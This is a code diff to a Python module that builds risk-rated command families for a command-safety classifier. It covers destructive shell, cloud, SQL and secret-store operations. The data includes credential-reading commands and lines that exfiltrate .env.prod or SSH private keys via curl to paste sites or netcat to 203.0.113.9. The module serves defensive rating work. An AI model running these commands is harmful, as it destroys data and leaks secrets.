@@ -60,7 +60,11 @@ class Scope:
 
 @dataclass(frozen=True, slots=True)
 class Variant:
-    """A way of invoking the operation; ``shift`` moves the level by one step."""
+    """A way of invoking the operation; ``shift`` moves the level, clamped to the taxonomy.
+
+    ``category`` overrides the family category when one family spans tools, as the
+    read-only inspection family does.
+    """
 
     name: str
     shift: int = 0
@@ -68,6 +72,7 @@ class Variant:
     args: str = ""
     body: str = ""
     note: str = ""
+    category: str | None = None
 
 
 @dataclass(frozen=True, slots=True)
@@ -75,6 +80,7 @@ class Family:
     """One command family: a template realized over scopes and variants."""
 
     name: str
+    category: str
     shell: str
     template: str
     note: str
@@ -99,6 +105,7 @@ class Family:
                 scope=scope.text,
             ),
             level=self.level_for(scope, variant),
+            category=variant.category or self.category,
             group=self.group_for(scope, variant),
             shell=self.shell,
             reason=_sentence(self.note, scope.note, variant.note),
@@ -114,6 +121,7 @@ class Family:
 FAMILIES: Final[tuple[Family, ...]] = (
     Family(
         name="rm_recursive",
+        category="shell",
         shell="bash",
         template="{prefix}rm {args} {scope}",
         note="Recursive deletion of a directory tree",
@@ -140,6 +148,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="find_delete",
+        category="shell",
         shell="bash",
         template="{prefix}find {scope} {args} -delete",
         note="Bulk deletion driven by find",
@@ -158,6 +167,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="shred_file",
+        category="shell",
         shell="bash",
         template="{prefix}shred {args} {scope}",
         note="Shredding a file, which is designed to prevent recovery",
@@ -176,6 +186,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="truncate_file",
+        category="shell",
         shell="bash",
         template="{prefix}truncate {args} {scope}",
         note="Truncating a file to zero length",
@@ -197,6 +208,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="redirect_overwrite",
+        category="shell",
         shell="bash",
         template="{prefix}{body} {args} {scope}",
         note="Shell redirection into a file",
@@ -216,6 +228,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="dd_overwrite",
+        category="shell",
         shell="bash",
         template="{prefix}dd if={body} of={scope} bs=1M {args}",
         note="Raw block level write with dd",
@@ -233,6 +246,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="mkfs",
+        category="shell",
         shell="bash",
         template="{prefix}mkfs.{body} {scope}",
         note="Creating a new filesystem on a device",
@@ -245,6 +259,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="wipefs",
+        category="shell",
         shell="bash",
         template="{prefix}wipefs {args} {scope}",
         note="Removing filesystem signatures from a device",
@@ -256,6 +271,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="chmod_recursive",
+        category="shell",
         shell="bash",
         template="{prefix}chmod -R {args} {scope}",
         note="Recursive permission change",
@@ -273,6 +289,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="chown_recursive",
+        category="shell",
         shell="bash",
         template="{prefix}chown -R {args} {scope}",
         note="Recursive ownership change",
@@ -289,6 +306,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="iptables_flush",
+        category="system",
         shell="bash",
         template="{prefix}iptables {args}",
         note="Removing firewall rules",
@@ -306,6 +324,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="systemctl_impact",
+        category="system",
         shell="bash",
         template="{prefix}systemctl {args} {scope}",
         note="Stopping or disabling a systemd unit",
@@ -324,6 +343,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="git_reset_hard",
+        category="git",
         shell="bash",
         template="{prefix}git reset {args} {scope}",
         note="Rewinding a git branch",
@@ -341,6 +361,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="git_clean",
+        category="git",
         shell="bash",
         template="{prefix}git clean {args}",
         note="Deleting untracked files",
@@ -353,6 +374,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="mv_devnull",
+        category="shell",
         shell="bash",
         template="{prefix}mv {args} {scope} /dev/null",
         note="Moving a path onto /dev/null",
@@ -363,6 +385,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="git_push",
+        category="git",
         shell="bash",
         template="{prefix}git push {args} {scope}",
         note="Pushing to a shared remote branch",
@@ -385,6 +408,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="git_branch_delete",
+        category="git",
         shell="bash",
         template="{prefix}git branch -D {scope}",
         note="Force deleting a local branch",
@@ -396,6 +420,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="docker_reclaim",
+        category="containers",
         shell="bash",
         template="{prefix}docker {scope}",
         note="Bulk docker cleanup",
@@ -422,6 +447,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="kubectl_delete",
+        category="kubernetes",
         shell="bash",
         template="{prefix}kubectl delete {args} {scope}",
         note="Deleting Kubernetes resources",
@@ -449,6 +475,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="helm_uninstall",
+        category="kubernetes",
         shell="bash",
         template="{prefix}helm uninstall {scope} {args}",
         note="Removing a helm release",
@@ -465,6 +492,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="terraform_destroy",
+        category="terraform",
         shell="bash",
         template="{prefix}terraform destroy {scope} {args}",
         note="Destroying terraform managed infrastructure",
@@ -486,6 +514,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="aws_ec2_terminate",
+        category="aws",
         shell="bash",
         template="{prefix}aws ec2 terminate-instances --instance-ids {scope} {args}",
         note="Terminating a compute instance",
@@ -501,6 +530,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="aws_rds_delete",
+        category="aws",
         shell="bash",
         template="{prefix}aws rds delete-db-instance --db-instance-identifier {scope} {args}",
         note="Deleting a managed database instance",
@@ -528,6 +558,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="aws_s3_rm",
+        category="aws",
         shell="bash",
         template="{prefix}aws s3 rm s3://{scope} {args}",
         note="Deleting S3 objects",
@@ -543,6 +574,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="aws_s3api_delete_bucket",
+        category="aws",
         shell="bash",
         template="{prefix}aws s3api delete-bucket --bucket {scope}",
         note="Deleting an S3 bucket",
@@ -553,6 +585,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="aws_eks_delete_cluster",
+        category="aws",
         shell="bash",
         template="{prefix}aws eks delete-cluster --name {scope}",
         note="Deleting a Kubernetes control plane",
@@ -564,6 +597,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="aws_dynamodb_delete_table",
+        category="aws",
         shell="bash",
         template="{prefix}aws dynamodb delete-table --table-name {scope}",
         note="Deleting a database table",
@@ -574,6 +608,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="aws_cloudformation_delete_stack",
+        category="aws",
         shell="bash",
         template="{prefix}aws cloudformation delete-stack --stack-name {scope}",
         note="Deleting an infrastructure stack",
@@ -584,6 +619,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="gcloud_instances_delete",
+        category="gcp",
         shell="bash",
         template="{prefix}gcloud compute instances delete {scope} {args}",
         note="Deleting a Compute Engine instance",
@@ -598,6 +634,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="gcloud_clusters_delete",
+        category="gcp",
         shell="bash",
         template="{prefix}gcloud container clusters delete {scope} {args}",
         note="Deleting a Kubernetes cluster",
@@ -612,6 +649,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="gcloud_sql_delete",
+        category="gcp",
         shell="bash",
         template="{prefix}gcloud sql instances delete {scope} {args}",
         note="Deleting a managed database instance",
@@ -626,6 +664,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="sql_drop_database",
+        category="sql",
         shell="sql",
         template="{prefix}DROP DATABASE {scope}{args};",
         note="Dropping a database",
@@ -642,6 +681,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="sql_drop_table",
+        category="sql",
         shell="sql",
         template="{prefix}DROP TABLE {scope}{args};",
         note="Dropping a table",
@@ -658,6 +698,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="sql_drop_schema",
+        category="sql",
         shell="sql",
         template="{prefix}DROP SCHEMA {scope}{args};",
         note="Dropping a schema and everything in it",
@@ -672,6 +713,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="sql_truncate_table",
+        category="sql",
         shell="sql",
         template="{prefix}TRUNCATE TABLE {scope}{args};",
         note="Truncating a table, which removes every row",
@@ -691,6 +733,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="sql_delete_rows",
+        category="sql",
         shell="sql",
         template="{prefix}DELETE FROM {scope}{args};",
         note="Deleting rows",
@@ -707,6 +750,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="sql_revoke",
+        category="sql",
         shell="sql",
         template="{prefix}REVOKE {args} ON {scope} FROM app_user;",
         note="Revoking database privileges",
@@ -723,6 +767,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="redis_flush",
+        category="redis",
         shell="redis",
         template="{prefix}redis-cli -h {scope} {args}",
         note="Flushing a Redis instance",
@@ -739,6 +784,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="es_delete_indices",
+        category="elasticsearch",
         shell="http",
         template="{prefix}curl -X DELETE '{scope}{args}'",
         note="Deleting Elasticsearch indices",
@@ -755,6 +801,7 @@ FAMILIES: Final[tuple[Family, ...]] = (
     ),
     Family(
         name="read_only_inspection",
+        category="shell",
         shell="bash",
         template="{prefix}{body} {args} {scope}",
         note="Read-only inspection",
@@ -763,38 +810,43 @@ FAMILIES: Final[tuple[Family, ...]] = (
         variants=(
             Variant("ls_logs", body="ls -la /var/log"),
             Variant("grep_source", body="grep -R TODO ./src"),
-            Variant("docker_ps", body="docker ps"),
-            Variant("kubectl_get_pods", body="kubectl get pods -n production"),
-            Variant("aws_describe", body="aws ec2 describe-instances"),
-            Variant("git_status", body="git status"),
+            Variant("docker_ps", body="docker ps", category="containers"),
+            Variant("kubectl_get_pods", body="kubectl get pods -n production", category="kubernetes"),
+            Variant("aws_describe", body="aws ec2 describe-instances", category="aws"),
+            Variant("git_status", body="git status", category="git"),
             Variant("df", body="df -h"),
-            Variant("terraform_plan", body="terraform plan -chdir=environments/production"),
-            Variant("du", body="du -sh /srv/application-data"),
             Variant(
-                "cat_shadow", body="cat /etc/shadow", shift=-1, note="secret material is printed into the session log"
+                "terraform_plan",
+                body="terraform plan -chdir=environments/production",
+                category="terraform",
             ),
+            Variant("du", body="du -sh /srv/application-data"),
             Variant(
                 "kubectl_secret",
                 body="kubectl get secret prod-db-creds -n production -o yaml",
                 shift=-1,
                 note="credentials are exposed in the output",
+                category="kubernetes",
             ),
             Variant(
                 "pg_dump",
                 body="docker exec prod-db pg_dump -U app production",
                 shift=-1,
                 note="the production database is dumped into the session",
+                category="containers",
             ),
             Variant(
                 "s3_cp_backup",
                 body="aws s3 cp s3://prod-backups/latest.dump -",
                 shift=-1,
                 note="a production backup is streamed to the terminal",
+                category="aws",
             ),
         ),
     ),
     Family(
         name="sql_select",
+        category="sql",
         shell="sql",
         template="{prefix}{body} {args} {scope}",
         note="Read-only query",
@@ -809,6 +861,322 @@ FAMILIES: Final[tuple[Family, ...]] = (
                 "audit_all", body="SELECT * FROM audit_log;", shift=-1, note="an unbounded audit table is read out"
             ),
             Variant("copy_out", body="COPY audit_log TO STDOUT;", shift=-1, note="the audit table is exported in bulk"),
+        ),
+    ),
+    Family(
+        name="op_item_write",
+        category="onepassword",
+        shell="bash",
+        template="{prefix}{body} {scope} {args}",
+        note="Mutating an item in the shared secret store",
+        scopes=(
+            Scope("prod_item", '"Production Database"', 1, "the credential deploy automation reads"),
+            Scope("ci_item", '"CI Deploy Token"', 1, "pipeline authentication stops working at once"),
+            Scope("customer_item", '"Acme API Key"', 1, "a customer integration credential"),
+            Scope("dev_item", '"Local Dev Sandbox"', 2, "developer-only item with no production consumer"),
+        ),
+        variants=(
+            Variant("delete", body="op item delete"),
+            Variant("rotate_password", body="op item edit", args="--generate-password=32"),
+            Variant("share_emails", body="op item share", args="--emails oncall@example.com --expires-in 1h"),
+            Variant(
+                "share_view_once",
+                body="op item share",
+                args="--emails oncall@example.com --view-once",
+                shift=1,
+                note="the link stops working after a single view, which narrows who can read the item",
+            ),
+            Variant(
+                "archive",
+                body="op item delete",
+                args="--archive",
+                shift=1,
+                note="moved to the trash, where it stays restorable for 30 days",
+            ),
+        ),
+    ),
+    Family(
+        name="op_item_move",
+        category="onepassword",
+        shell="bash",
+        template="{prefix}{body} {args} {scope}",
+        note="Moving an item into another vault, which changes who can read it",
+        scopes=(
+            Scope(
+                "to_shared",
+                '"Production Database" --current-vault Production --destination-vault Shared',
+                1,
+                "access widens to every member of the shared vault",
+            ),
+            Scope(
+                "to_dev",
+                '"Production Database" --current-vault Production --destination-vault Dev',
+                2,
+                "a production credential is exposed to every developer",
+            ),
+        ),
+        variants=(Variant("move", body="op item move"),),
+    ),
+    Family(
+        name="op_group_admin",
+        category="onepassword",
+        shell="bash",
+        template="{prefix}{body} {scope} {args}",
+        note="Changing a secret-store group",
+        scopes=(
+            Scope("engineering", '"Engineering"', 1, "the group that holds production vault access"),
+            Scope("oncall", '"Oncall"', 1, "the group that reads break-glass credentials"),
+            Scope("contractors", '"Contractors"', 1, "an externally staffed group"),
+        ),
+        variants=(
+            Variant("delete", body="op group delete"),
+            Variant("rename", body="op group edit", args='--name "deprecated"'),
+            Variant("grant_user", body="op group user grant --group", args="--user intern@example.com --role member"),
+        ),
+    ),
+    Family(
+        name="op_user_admin",
+        category="onepassword",
+        shell="bash",
+        template="{prefix}{body} {scope} {args}",
+        note="Changing a secret-store account",
+        scopes=(
+            Scope("ops_user", "ops@example.com", 1, "an account with production vault access"),
+            Scope("contractor_user", "contractor@example.com", 1, "an account outside the company"),
+            Scope("service_user", "ci-bot@example.com", 1, "the service account automation signs in with"),
+        ),
+        variants=(
+            Variant("delete", body="op user delete"),
+            Variant("suspend", body="op user suspend"),
+            Variant("travel_mode", body="op user edit", args="--travel-mode on"),
+            Variant("edit_name", body="op user edit", args="--name ops-legacy"),
+        ),
+    ),
+    Family(
+        name="op_vault_delete",
+        category="onepassword",
+        shell="bash",
+        template="{prefix}{body} {scope} {args}",
+        note="Deleting a whole secret store vault",
+        scopes=(
+            Scope("prod_vault", '"Production"', 1, "every production credential lives in this vault"),
+            Scope("shared_vault", '"Shared"', 2, "cross-team credentials, recoverable only from a vault backup"),
+            Scope("dev_vault", '"Dev"', 2, "developer-only credentials"),
+        ),
+        variants=(Variant("delete", body="op vault delete"),),
+    ),
+    Family(
+        name="op_read_only",
+        category="onepassword",
+        shell="bash",
+        template="{prefix}{body} {scope} {args}",
+        note="Read-only secret-store inspection",
+        scopes=(Scope("account", "", 5, "nothing in the account is modified"),),
+        group_by="variant",
+        variants=(
+            Variant("user_list", body="op user list"),
+            Variant("group_list", body="op group list"),
+            Variant("vault_list", body="op vault list"),
+            Variant("item_list", body="op item list", args="--vault Production"),
+            Variant("whoami", body="op whoami"),
+            Variant("get_title", body="op item get", args='"Production Database" --fields title,updated_at'),
+            Variant(
+                "get_reveal",
+                body="op item get",
+                args='"Production Database" --reveal',
+                shift=-1,
+                note="the stored value is printed into the session log",
+            ),
+            Variant(
+                "get_password_field",
+                body="op item get",
+                args='"Production Database" --fields password',
+                shift=-1,
+                note="the password field is printed, which is the whole secret",
+            ),
+        ),
+    ),
+    Family(
+        name="secret_file_read",
+        category="sensitive_files",
+        shell="bash",
+        template="{prefix}{body} {args} {scope}",
+        note="Reading a file that can carry credentials",
+        scopes=(
+            Scope("env_example", ".env.example", 5, "a template of variable names with no values"),
+            Scope("gitignore", ".gitignore", 5, "ignore rules, no secret material"),
+            Scope("public_key", "~/.ssh/id_rsa.pub", 5, "the public half of a key pair"),
+            Scope("env_local", ".env.local", 4, "developer-scoped values"),
+            Scope("env", ".env", 4, "project credentials"),
+            Scope("env_qa", ".env.qa", 4, "QA credentials"),
+            Scope("env_staging", ".env.staging", 4, "staging credentials"),
+            Scope("env_prod", ".env.prod", 3, "production credentials with a wider blast radius"),
+            Scope("ssh_private", "~/.ssh/id_rsa", 3, "the private half of a key pair"),
+            Scope("aws_credentials", "~/.aws/credentials", 3, "long-lived cloud keys"),
+            Scope("kubeconfig", "~/.kube/config", 3, "cluster credentials and client certificates"),
+            Scope("tfstate", "terraform.tfstate", 3, "infrastructure state, which embeds every provider secret"),
+            Scope("gcp_key", "service-account.json", 3, "a cloud service account key"),
+            Scope("shadow", "/etc/shadow", 4, "password hashes for every local account"),
+            Scope("netrc", "~/.netrc", 4, "plaintext credentials for remote hosts"),
+            Scope("docker_config", "~/.docker/config.json", 4, "registry credentials"),
+            Scope("npmrc", ".npmrc", 4, "registry tokens"),
+            Scope("git_credentials", "~/.git-credentials", 4, "plaintext forge tokens"),
+            Scope("pgpass", "~/.pgpass", 4, "database passwords"),
+            Scope("vault_token", "~/.vault-token", 3, "a live session token for the secret store"),
+            Scope("pem_key", "server.key", 3, "a TLS private key"),
+        ),
+        variants=(
+            Variant("cat", body="cat"),
+            Variant("head", body="head -n 20"),
+            Variant("grep_values", body="grep -i -e token -e password -e secret"),
+            Variant("base64", body="base64"),
+            Variant(
+                "metadata_only",
+                body="ls -l",
+                shift=1,
+                note="only the path, owner, and permissions are shown, not the contents",
+            ),
+        ),
+    ),
+    Family(
+        name="secret_file_upload",
+        category="sensitive_files",
+        shell="bash",
+        template="{prefix}{body}{scope} {args}",
+        note="Sending a file that can carry credentials off the host",
+        scopes=(
+            Scope("env_prod", ".env.prod", 1, "production credentials leave the environment for good"),
+            Scope("ssh_private", "~/.ssh/id_rsa", 1, "a private key that cannot be recalled once published"),
+            Scope("env", ".env", 3, "project credentials are copied to another host"),
+            Scope("tfstate", "terraform.tfstate", 3, "infrastructure state is copied to another host"),
+            Scope("env_example", ".env.example", 5, "a template with no values is uploaded"),
+            Scope("gitignore", ".gitignore", 5, "no secret material is uploaded"),
+        ),
+        variants=(
+            Variant("curl_post", body="curl -X POST --data-binary @", args="https://paste.rs/9f2a"),
+            Variant("curl_form", body="curl -F file=@", args="https://0x0.st"),
+            Variant("scp", body="scp ", args="jump@10.0.0.7:/tmp/"),
+            Variant("s3_public", body="aws s3 cp ", args="s3://customer-share/ --acl public-read"),
+            Variant("gcs_bucket", body="gcloud storage cp ", args="gs://shared-exports/"),
+            Variant("netcat", body="nc 203.0.113.9 9999 < ", args=""),
+        ),
+    ),
+    Family(
+        name="secret_file_commit",
+        category="sensitive_files",
+        shell="bash",
+        template="{prefix}{body} {scope} {args}",
+        note="Staging a file that can carry credentials for commit",
+        scopes=(
+            Scope("env_prod", ".env.prod", 2, "committed credentials have to be rotated and the history rewritten"),
+            Scope("ssh_private", "~/.ssh/id_rsa", 2, "the private key would live in the repository history"),
+            Scope("tfstate", "terraform.tfstate", 2, "the state file embeds provider secrets and remote state paths"),
+            Scope("env", ".env", 3, "project credentials enter the history"),
+            Scope("npmrc", ".npmrc", 3, "a registry token enters the history"),
+            Scope("env_example", ".env.example", 5, "a template with no values is committed"),
+        ),
+        variants=(
+            Variant("add", body="git add"),
+            Variant(
+                "force_add",
+                body="git add -f",
+                note="the ignore rule is bypassed, so the file is staged anyway",
+            ),
+            Variant(
+                "diff_cached",
+                body="git diff --cached",
+                shift=1,
+                note="the staged secret is printed into the terminal",
+            ),
+            Variant(
+                "check_ignore",
+                body="git check-ignore -v",
+                shift=3,
+                note="only the ignore rule is tested, nothing is staged",
+            ),
+        ),
+    ),
+    Family(
+        name="secret_file_env_dump",
+        category="sensitive_files",
+        shell="bash",
+        template="{prefix}{body} {args} {scope}",
+        note="Printing process environment variables",
+        scopes=(Scope("process", "", 4, "the credentials of the running process are printed"),),
+        group_by="variant",
+        variants=(
+            Variant("env", body="env | sort"),
+            Variant("printenv", body="printenv"),
+            Variant("own_environ", body="cat /proc/self/environ | tr '\\0' '\\n'"),
+            Variant(
+                "other_environ",
+                body="sudo cat /proc/1/environ | tr '\\0' '\\n'",
+                shift=-1,
+                note="the environment of another process is read, not just this one",
+            ),
+            Variant("echo_secret", body="echo $AWS_SECRET_ACCESS_KEY"),
+            Variant("history_grep", body="history | grep -i -e token -e secret -e password"),
+            Variant("docker_env", body="docker inspect prod-api --format '{{.Config.Env}}'"),
+            Variant(
+                "kubectl_env",
+                body="kubectl exec prod-api-0 -- env",
+                shift=-1,
+                note="the environment of a production pod is printed",
+            ),
+            Variant(
+                "control_path",
+                body="printenv PATH",
+                shift=1,
+                note="one variable that carries no secret",
+            ),
+        ),
+    ),
+    Family(
+        name="secret_file_scan",
+        category="sensitive_files",
+        shell="bash",
+        template="{prefix}{body} {scope} {args}",
+        note="Scanning a tree for credential files",
+        scopes=(
+            Scope("repo", ".", 3, "the repository is searched for anything that looks like a credential"),
+            Scope("home", "$HOME", 3, "the home directory is searched"),
+            Scope("filesystem", "/", 2, "the whole filesystem is searched"),
+        ),
+        variants=(
+            Variant("find_env", body="find", args="-name '.env*' -type f"),
+            Variant("find_keys", body="find", args="-name 'id_*' -o -name '*.pem' -o -name '*.key'"),
+            Variant("grep_private_key", body="grep -r -I -l -e 'BEGIN RSA PRIVATE KEY'"),
+            Variant(
+                "find_control",
+                body="find",
+                args="-name '.env.example'",
+                shift=2,
+                note="only a template is looked for",
+            ),
+        ),
+    ),
+    Family(
+        name="secret_file_materialize",
+        category="sensitive_files",
+        shell="bash",
+        template="{prefix}{body}{scope} {args}",
+        note="Expanding a credential file into another artifact",
+        scopes=(
+            Scope("env_prod", ".env.prod", 3, "production credentials are written into a generated artifact"),
+            Scope("env", ".env", 3, "project credentials are written into a generated artifact"),
+            Scope("secret_yaml", "secrets.yaml", 3, "an encrypted secret file is decrypted into the terminal"),
+            Scope("env_example", ".env.example", 5, "a template with no values is expanded"),
+        ),
+        variants=(
+            Variant("envsubst", body="envsubst < "),
+            Variant("docker_env_file", body="docker run --rm --env-file ", args="alpine env"),
+            Variant("compose_config", body="docker compose --env-file ", args="config"),
+            Variant(
+                "kubectl_secret_yaml",
+                body="kubectl create secret generic app-env --from-env-file=",
+                args="-o yaml",
+            ),
+            Variant("ansible_vault_view", body="ansible-vault view "),
         ),
     ),
 )
